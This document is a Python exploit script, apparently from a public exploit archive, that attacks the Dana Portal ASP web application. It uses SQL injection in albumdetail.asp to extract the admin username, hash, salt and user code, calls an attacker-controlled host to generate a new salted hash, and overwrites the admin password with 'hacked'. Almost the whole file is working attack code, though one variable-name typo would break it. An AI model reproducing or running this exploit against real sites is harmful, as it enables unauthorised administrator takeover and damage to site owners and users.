#!/usr/bin/python
# Abysssec Inc Public Exploit Code
# Title  : Dana Portal Remote Change Admin Password Exploit
# Affected Version : ASP Version
# Vulnerable File : albumdetail.asp
# Vendor  Site   : www.dana.ir

# note :  no point to keep it private anymore .
# This exploit ueses of sql injection vulnerability exist in DANA Portal asp version 
# the "real" problem is when you extract SHA1 hash , hash is not clear and is SHA1+Salt
# The alghorithm is not really hard to break and writing cracker tool but i prefered 
# To update admin password (SH1 + Salt ) with "hacked" word . 
# this exploit is just for educational purpose and author will  be not be responsible for any damage using this exploit .
# feel free to contact me at : admin [at] abysssec.com 

# for working  with this exploit you need two asp file for updating hash you can download both from : 
# www.abysssec.com/files/dana.zip
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/8719.zip (2009-dana.zip)

# then need to upload asp files and change  this "http://wwww.yourasphost.com/salt.asp?salt="  in exploit code

import string
import urllib
import sys
import re

def Abysssec():
        print "\n"
        print "#####################################################"
        print "#     DanaPortal Remote Change Password Exploit     #"
        print "#              	 www.Abysssec.com              	   #"
        print "#####################################################"
        print "\n"



#Call Banner
Abysssec()

print "\n[+] Target Host: e.g: http://site.com/danaportal/"
try:
        host=raw_input("\nTarget Host : ")
except KeyboardInterrupt:
        print "\n[-] Program Terminated"
        sys.exit()


print "\n[+] Trying  To Connect ...\n"

# Check Http in string
if host[:7] == "http://":
        pass
else:
        host = "http://"+host

        
#SQL Injection URL
sql_inject=host+"/albumdetail.asp?Gid=1+or+1=(select+top+1+username+from+tblAuthor)--"

response = urllib.urlopen(sql_inject).read()

print "[+] Trying  To Inject Code ...\n"

#Extract Admin User
findall_users=re.compile('<font face="Arial" size=2>Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.</font>').findall
found_users=findall_users(response)

#check found user length
if len(found_ussers)==0:
    print "[-] Exploit Failed, Maybe Your Target Is Not Vulnerable "
    sys.exit()
        

print "\n[+] Admin User :  ",found_users[0]

# Extract Admin Hash
hash_inject = host+"/albumdetail.asp?Gid=1+or+1=(select+top+1+password+from+tblAuthor+where+username+in+('"+found_users[0]+"'))--"
response = urllib.urlopen(hash_inject).read()
findall_hashs=re.compile('<font face="Arial" size=2>Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.</font>').findall
found_hashs=findall_hashs(response)
if len(found_hashs)==0:
    print "[-] Exploit Failed, Maybe Your Target Is Not Vulnerable "
    sys.exit()
    
print "\n[+] Admin Hash :  ",found_hashs[0]

# Extract Admin Salt
salt_inject = host+"/albumdetail.asp?Gid=1+or+1=(select+top+1+salt+from+tblAuthor+where+username+in+('"+found_users[0]+"'))--"
response = urllib.urlopen(salt_inject).read()
findall_salt=re.compile('<font face="Arial" size=2>Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.</font>').findall
found_salt=findall_salt(response)
if len(found_salt)==0:
    print "[-] Exploit Failed, Maybe Your Target Is Not Vulnerable "
    sys.exit()    
print "\n[+] Admin Salt :  ",found_salt[0]


# Extract User Code
usercode_inject = host+"/albumdetail.asp?Gid=1+or+1=(select+top+1+user_code+from+tblAuthor+where+username+in+('"+found_users[0]+"'))--"
response = urllib.urlopen(usercode_inject).read()
findall_usercode=re.compile('<font face="Arial" size=2>Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.</font>').findall
found_usercode=findall_usercode(response)
if len(found_usercode)==0:
    print "[-] Exploit Failed, Maybe Your Target Is Not Vulnerable "
    sys.exit()
    
print "\n[+] Admin Code :  ",found_usercode[0]

# Generate New Hash + Salt
update_password = "http://wwww.yourasphost.com/salt.asp?salt="+found_salt[0] # change this url with yours !
response = urllib.urlopen(update_password).read()
findall_update=re.compile('(\w+)</object>').findall

found_update=findall_update(response)

updated_hash = ''.join(found_update)

# Update Password
usercode_inject = host+"/albumdetail.asp?Gid=-1+UPDATE+tblauthor+SET+password='"+updated_hash+"'+where+username='"+found_users[0]+"'--"

response = urllib.urlopen(usercode_inject).read()

if len(response) == 0:
        print "[-] Exploit Failed, Maybe Your Target Is Not Vulnerable "
        sys.exit()
else:
        print "[+] Updated Successfully \n"
        print "[+] Login Url : "+host+"/manage"
        print "[+] Username  : "+found_users[0]
        print "[+] Password  : hacked"

# milw0rm.com [2009-05-18]